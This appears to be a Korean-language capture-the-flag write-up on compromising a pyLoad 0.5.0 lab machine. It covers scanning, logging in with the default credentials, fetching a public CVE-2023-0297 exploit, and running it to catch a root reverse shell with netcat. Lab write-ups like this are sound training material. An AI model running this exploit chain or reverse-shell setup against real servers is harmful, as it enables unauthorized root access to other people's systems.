
## Nmap
```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ nnmap 192.168.132.26
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-29 10:45 +0900
Nmap scan report for 192.168.132.26
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
| http-title: Login - pyLoad
|_Requested resource was /login?next=http://192.168.132.26:9666/
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Cheroot/8.6.0
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   66.52 ms 192.168.45.1
2   66.47 ms 192.168.45.254
3   67.04 ms 192.168.251.1
4   67.26 ms 192.168.132.26

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.56 seconds
```

웹페이지 접근 후 로그인 창 확인
![[Pasted image 20260629105530.png]]

pyloader 초기 패스워드 확인`pyload/pyload`
![[Pasted image 20260629105429.png]]

pyload 버전 확인
![[Pasted image 20260629111029.png]]

searchsploit 활용하여 py 다운로드
```bash
┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ searchsploit pyload
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)                 | python/webapps/51532.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ searchsploit -m 51532
  Exploit: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51532
     Path: /usr/share/exploitdb/exploits/python/webapps/51532.py
    Codes: CVE-2023-0297
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/PG/pyLoader/CVE-2023-0297/51532.py
```

![[Pasted image 20260629111246.png]]

다운받은 payload에서 cve 확인
```bash
┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ ls
51532.py  CVE-2023-0297.sh  README.md

┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ cat 51532.py
# Exploit Title: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)
# Date: 06-10-2023
# Credits: bAu @bauh0lz
# Exploit Author: Gabriel Lima (0xGabe)
# Vendor Homepage: https://pyload.net/
# Software Link: https://github.com/pyload/pyload
# Version: 0.5.0
# Tested on: Ubuntu 20.04.6
# CVE: CVE-2023-0297
```

![[Pasted image 20260629111330.png]]

payload 검색
![[Pasted image 20260629111355.png]]

https://github.com/overgrowncarrot1/CVE-2023-0297
pyload 다운로드 
```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ git clone https://github.com/overgrowncarrot1/CVE-2023-0297.git
Cloning into 'CVE-2023-0297'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (6/6), done.
```
![[Pasted image 20260629111431.png]]

payload 실행
```bash
┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ bash CVE-2023-0297.sh -l 192.168.45.156 -p 4444 -w http://192.168.132.26:9666
         _____ _____  _____    ________   ___     _____  ___ ______
        |  _  |  __ \/  __ \   | ___ \ \ / / |   |  _  |/ _ \|  _  \
        | | | | |  \/| /  \/   | |_/ /\ V /| |   | | | / /_\ \ | | |
        | | | | | __ | |       |  __/  \ / | |   | | | |  _  | | | |
        \ \_/ / |_\ \| \__/\   | |     | | | |___\ \_/ / | | | |/ /
         \___/ \____/ \____/   \_|     \_/ \_____/\___/\_| |_/___/


Run nc -lvnp 4444, press enter to continue
```

![[Pasted image 20260629111457.png]]



root획득 후 flag 확인
```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.26] 39058
bash: cannot set terminal process group (902): Inappropriate ioctl for device
bash: no job control in this shell
root@pyloader:~/.pyload/data# whoami
whoami
root
root@pyloader:~/.pyload/data# cd /root/
cd /root/
root@pyloader:~# ls
ls
Downloads
email5.txt
proof.txt
snap
root@pyloader:~# cat proof.txt
cat proof.txt
8e83040ffcced0d40655d685a19821af
root@pyloader:~#
```

![[Pasted image 20260629111100.png]]